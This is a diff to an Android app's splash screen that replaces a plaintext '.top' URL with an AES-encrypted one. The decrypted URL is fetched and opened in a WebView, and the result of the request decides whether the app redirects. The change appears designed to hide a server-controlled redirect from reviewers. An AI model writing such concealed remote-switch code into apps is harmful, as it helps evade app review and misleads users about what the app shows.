@@ -10,8 +10,10 @@ import androidx.appcompat.app.AppCompatActivity
 import com.appsflyer.AppsFlyerLib
 import com.odfudndh.mvjsu.MainActivity
 import com.odfudndh.mvjsu.databinding.ActivitySplashBinding
+import com.odfudndh.mvjsu.utils.EncryptorUtils
 import com.odfudndh.mvjsu.utils.HttpManager
 import com.odfudndh.mvjsu.utils.NetResponseListener
+import com.odfudndh.mvjsu.utils.NetUtils
 
 class SplashActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -29,14 +31,13 @@ class SplashActivity : AppCompatActivity() {
         init()
     }
 
-    val url = "https://kofejwfigergd.top/wap.html"
     private fun init() {
         AppsFlyerLib.getInstance().init("HsqihnFkRNhYUWoMkmyXzh", null, applicationContext)
         AppsFlyerLib.getInstance().start(this)
-        HttpManager.getRequest(url, object : NetResponseListener {
+        HttpManager.getRequest(EncryptorUtils.decryptAES(NetUtils.loadUrl,NetUtils.secretKey), object : NetResponseListener {
             override fun requestListener(success: Boolean) {
                 Intent(this@SplashActivity, WebViewActivity::class.java).apply {
-                    putExtra("jumpUrl", url)
+                    putExtra("jumpUrl", EncryptorUtils.decryptAES(NetUtils.loadUrl,NetUtils.secretKey))
                     putExtra("isJump", success)
                     startActivityForResult(this, 10001)
                     if (success) finish()
